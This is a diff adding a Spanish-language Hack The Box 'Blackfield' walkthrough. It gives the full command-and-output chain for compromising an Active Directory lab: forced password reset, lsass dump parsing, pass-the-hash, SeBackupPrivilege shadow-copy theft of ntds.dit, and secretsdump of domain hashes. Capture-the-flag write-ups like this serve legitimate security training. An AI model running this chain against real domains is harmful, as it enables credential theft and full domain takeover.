@@ -274,4 +274,475 @@ domain_computers.html        domain_groups.html     domain_policy.html  domain_t
 
 ### Con la ayuda de bloodhound se pudo observar que hay un usuario al que se le puede cambiar la contraseña. 
 
+### con ldapdomaindump podemos hacer una extraer información de un Active Directory a través del protocolo LDAP Específicamente, permite realizar un volcado (dump) de los datos del dominio, proporcionando una visión completa y estructurada de la jerarquía y los objetos en el directorio.
 
+```
+──(root㉿kali)-[/home/…/blackfield/content/mapeo/mapeo2]
+└─# ldapdomaindump -u 'blackfield.local\support' -p '#00^BlackKnight' 10.10.10.192
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+
+┌──(root㉿kali)-[/home/…/blackfield/content/mapeo/mapeo2]
+└─# ls
+domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
+domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
+domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
+
+```
+### podermos ver los archivos html publicando un servidor con python y pero es mejor con bloodhound ps nos da recomendaciones para atacar el AS, para iniciarlo, primero tenermos que iniciar `neo4j`
+
+```
+└─# neo4j console
+Directories in use:
+home:         /usr/share/neo4j
+config:       /usr/share/neo4j/conf
+logs:         /etc/neo4j/logs
+plugins:      /usr/share/neo4j/plugins
+import:       /usr/share/neo4j/import
+data:         /etc/neo4j/data
+certificates: /usr/share/neo4j/certificates
+licenses:     /usr/share/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+2024-07-06 16:28:26.752+0000 INFO  Starting...
+2024-07-06 16:28:37.957+0000 INFO  This instance is ServerId{1fd7c48e} (1fd7c48e-8f7d-4d4d-84ad-6ca0379cb622)
+2024-07-06 16:28:40.561+0000 INFO  ======== Neo4j 4.4.26 ========
+2024-07-06 16:28:42.932+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
+2024-07-06 16:28:42.933+0000 INFO  Updating the initial password in component 'security-users'
+2024-07-06 16:28:45.581+0000 INFO  Bolt enabled on localhost:7687.
+2024-07-06 16:28:49.301+0000 INFO  Remote interface available at http://localhost:7474/
+2024-07-06 16:28:49.357+0000 INFO  id: 1F101480ABD8EB68B212AC1D13C7385E22B7410C574FD155561F63A81EED54BB
+2024-07-06 16:28:49.357+0000 INFO  name: system
+2024-07-06 16:28:49.358+0000 INFO  creationDate: 2024-03-12T02:26:03.496Z
+2024-07-06 16:28:49.358+0000 INFO  Started.
+
+
+
+└─# bloodhound &>/dev/null &
+[1] 190340
+
+┌──(root㉿kali)-[~]
+└─# disown
+
+
+```
+
+### Luego de iniciar el bloodhound hacemos lanzamos el bllodhound-python que tiene un script para generar un archivp para poder verlo en bllodhound.
+
+```
+└─# bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local
+INFO: Found AD domain: blackfield.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 18 computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 316 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer:
+INFO: Querying computer: DC01.BLACKFIELD.local
+WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
+CRITICAL: CCache file is not found. Skipping...
+WARNING: DCE/RPC connection failed: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
+INFO: Done in 00M 42S
+
+
+┌──(root㉿kali)-[/home/…/htb/blackfield/content/bloodhound]
+└─# ls
+20240704093703_computers.json   20240704093703_gpos.json    20240704093703_users.json       20240706125829_domains.json  20240706125829_ous.json
+20240704093703_containers.json  20240704093703_groups.json  20240706125829_computers.json   20240706125829_gpos.json     20240706125829_users.json
+20240704093703_domains.json     20240704093703_ous.json     2024070
+
+```
+
+### en la opcion de bloohound cargamos los archivos, despues de analizar cada opcion bloodhound nos muestra que podemos cambiar las credenciales de un usuario
+
+```
+SUPPORT@BLACKFIELD.LOCAL tiene la capacidad de cambiar la contraseña del usuario AUDIT2020@BLACKFIELD.LOCAL sin conocer la contraseña actual de ese usuario.
+```
+
+###  sabiendo que podemos cambiar las credenciales de audit2020, podemos usar net rpc para cambiar la credencial
+
+```
+─# net rpc password audit2020 -U 'support' -S 10.10.10.192
+Enter new password for audit2020:
+Password for [WORKGROUP\support]:
+
+```
+### Habiendo cambiado el pass del usuario, y sabiendo que tenemos el puerto abierto de winrm podemos utilizar la herramienta winrm para acceder por consola, antes revisar si tenemos un pwned con crackmapexec si nos da un pwned
+
+### como no tenemos pwned validamos por smb que archivos se pueden consultar
+
+
+```
+─# smbmap -H 10.10.10.192 -u "audit2020" -p 'test2020$' -r profiles$ -r 'forensic/memory_analysis'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 10.10.10.192:445        Name: blackfield.local          Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        forensic                                                READ ONLY       Forensic / Audit share.
+        ./forensicmemory_analysis
+        dr--r--r--                0 Thu May 28 16:29:24 2020    .
+        dr--r--r--                0 Thu May 28 16:29:24 2020    ..
+        fr--r--r--         37876530 Thu May 28 16:29:24 2020    conhost.zip
+        fr--r--r--         24962333 Thu May 28 16:29:24 2020    ctfmon.zip
+        fr--r--r--         23993305 Thu May 28 16:29:24 2020    dfsrs.zip
+        fr--r--r--         18366396 Thu May 28 16:29:24 2020    dllhost.zip
+        fr--r--r--          8810157 Thu May 28 16:29:24 2020    ismserv.zip
+        fr--r--r--         41936098 Thu May 28 16:29:24 2020    lsass.zip
+        fr--r--r--         64288607 Thu May 28 16:29:24 2020    mmc.zip
+        fr--r--r--         13332174 Thu May 28 16:29:24 2020    RuntimeBroker.zip
+        fr--r--r--        131983313 Thu May 28 16:29:24 2020    ServerManager.zip
+        fr--r--r--         33141744 Thu May 28 16:29:24 2020    sihost.zip
+        fr--r--r--         33756344 Thu May 28 16:29:24 2020    smartscreen.zip
+        fr--r--r--         14408833 Thu May 28 16:29:24 2020    svchost.zip
+        fr--r--r--         34631412 Thu May 28 16:29:24 2020    taskhostw.zip
+        fr--r--r--         14255089 Thu May 28 16:29:24 2020    winlogon.zip
+        fr--r--r--          4067425 Thu May 28 16:29:24 2020    wlms.zip
+        fr--r--r--         18303252 Thu May 28 16:29:24 2020    WmiPrvSE.zip
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        profiles$                                               READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share
+
+```
+
+### Podemos descargar el lsass para dumpearlo
+```
+─# smbmap -H 10.10.10.192 -u "audit2020" -p 'test2020$' --download forensic/memory_analysis/lsass.zip
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+[+] Starting download: forensic\memory_analysis\lsass.zip (41936098 bytes)
+[+] File output to: /home/kali/Documents/htb/blackfield/content/lsass/10.10.10.192-forensic_memory_analysis_lsass.zip
+
+```
+
+### dumpeamos el lsass
+
+```┌──(root㉿kali)-[/home/…/htb/blackfield/content/lsass]
+└─# file lsass.DMP 
+lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
+                                                                                                                                                                                                    
+┌──(root㉿kali)-[/home/…/htb/blackfield/content/lsass]
+└─# pypykatz lsa minidump lsass.DMP 
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: svc_backup
+                Domain: BLACKFIELD.LOCAL
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+```
+### No relacione todoo el dump porque es muy grande
+
+### pero con el hash ahora buscamos nuestro hash de los usuarios que habiamos validado y podemos probar con crackmapexec si nos pwnea 
+
+
+```
+┌──(root㉿kali)-[/home/…/htb/blackfield/content/lsass]
+└─# crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
+
+```
+
+###Capturamos la flag de usuario
+
+```
+└─# evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
+blackfield\svc_backup
+
+```
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> system info
+The term 'system' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ system info
++ ~~~~~~
+    + CategoryInfo          : ObjectNotFound: (system:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
+
+HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
+    ProductName    REG_SZ    Windows Server 2019 Standard
+
+```
+
+### Podemos abusar del privilegio `SeBackupPrivilege` hacemos una consulta en google con la palabra abuse de este prilegio y nos sale mucha información.
+
+### en un principio vamos a subir un script para poder hacer un bk de la sam 
+
+### Script
+![]https://pentestlab.blog/tag/diskshadow/
+
+### Se crea el archivo con el script en el equipo atacante y despues se sube con ayuda de evilwinrm coloco caracter adicional porque cuando lo ejecuto me borra el ultimo caracter
+
+```
+set context persistent nowriterss
+add volume c: alias elfojhonn
+createe
+expose %elfojhon% z::
+```
+### Lanzamos el comando con ayuda de diskshadow
+
+```
+*Evil-WinRM* PS C:\tmp> diskshadow.exe /s .\sc.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  7/6/2024 7:34:21 PM
+
+-> set context persistent nowriters
+-> add volume c: alias elfojhon
+-> create
+Alias elfojhon for shadow ID {553308d3-35bb-430d-b630-a83d9b830771} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {8c783008-2640-4d9c-8f4b-4a8a9a9b87be} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {8c783008-2640-4d9c-8f4b-4a8a9a9b87be}
+
+        * Shadow copy ID = {553308d3-35bb-430d-b630-a83d9b830771}               %elfojhon%
+                - Shadow copy set: {8c783008-2640-4d9c-8f4b-4a8a9a9b87be}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 7/6/2024 7:34:23 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: DC01.BLACKFIELD.local
+                - Service machine: DC01.BLACKFIELD.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %elfojhon% z:
+-> %elfojhon% = {553308d3-35bb-430d-b630-a83d9b830771}
+The shadow copy was successfully exposed as z:\.
+->
+
+```
+
+### Habiendo creadoe el bk podemos ir a consultar el arcvhivo ntds.dit
+
+```
+*Evil-WinRM* PS C:\tmp> robocopy /b z:\windows\NTDS\ . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Saturday, July 6, 2024 7:48:30 PM
+   Source : z:\windows\NTDS\
+     Dest : C:\tmp\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           1    z:\windows\NTDS\
+            New File              18.0 m        ntds.dit
+  0.0%
+  0.3%
+
+ 99.3%
+ 99.6%
+100%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   18.00 m   18.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           111025694 Bytes/sec.
+   Speed :            6352.941 MegaBytes/min.
+   Ended : Saturday, July 6, 2024 7:48:30 PM
+
+*Evil-WinRM* PS C:\tmp> dir
+
+
+    Directory: C:\tmp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         7/6/2024   7:34 PM            611 2024-07-06_19-34-23_DC01.cab
+-a----         7/6/2024   4:07 PM       18874368 ntds.dit
+-a----         7/6/2024   7:30 PM             94 sc.txt
+
+
+
+```
+```
+
+Info: Downloading C:\tmp\ntds.dit to ntds.dit
+
+Info: Download successful!
+
+```
+### Importante tambien debemos descargar el archivo system de la ruta de regitro
+
+```
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\system system_
+The operation completed successfully.
+
+```
+```
+reg save HKLM\system system_:
+
+reg save es un comando de PowerShell que se utiliza para guardar una copia de una subclave del registro en un archivo.
+HKLM\system especifica la subclave del registro que se va a guardar. En este caso, se refiere a la subclave SYSTEM dentro del HKEY_LOCAL_MACHINE (HKLM), que contiene configuraciones críticas del sistema operativo.
+system_ es el nombre del archivo donde se guardará la copia de la subclave del registro. Este archivo se creará en el directorio actual, que es C:\Users\svc_backup\Documents.
+```
+
+### con impacket dumpeamos los archivo ntds.dit y con el system del registor
+
+```
+─# impacket-secretsdump -system system_ -ntds ntds.dit LOCAL
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ed1f080c84ef4866f476588c45e40555:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+
+```
+
+### probamos el powned con crackmapexec y con evilwinrm
+
+```
+└─# crackmapexec winrm 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
+
+```
+
+```└─# evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee' 
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+blackfield\administrator
+
+```
+
+# LISTO :) ATT ELFOJHON
